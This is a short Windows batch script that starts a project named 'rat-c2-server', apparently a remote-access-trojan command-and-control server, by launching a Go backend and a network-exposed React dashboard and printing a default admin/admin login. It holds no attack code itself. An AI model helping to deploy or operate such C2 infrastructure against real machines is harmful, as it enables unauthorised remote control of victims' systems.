@echo off
title rat-c2-server - Local Hosting
cd C:\Users\jayki\rat-c2-server

echo Starting Go server...
start "" ./out
timeout /t 3 /nobreak > nul

echo Starting React dashboard...
start "" cmd /c "cd web && npm run dev -- --host"

echo.
echo Both services starting...
echo Go server: http://localhost:8080
echo React dashboard: http://localhost:3000
echo Login: admin / admin
echo.
pause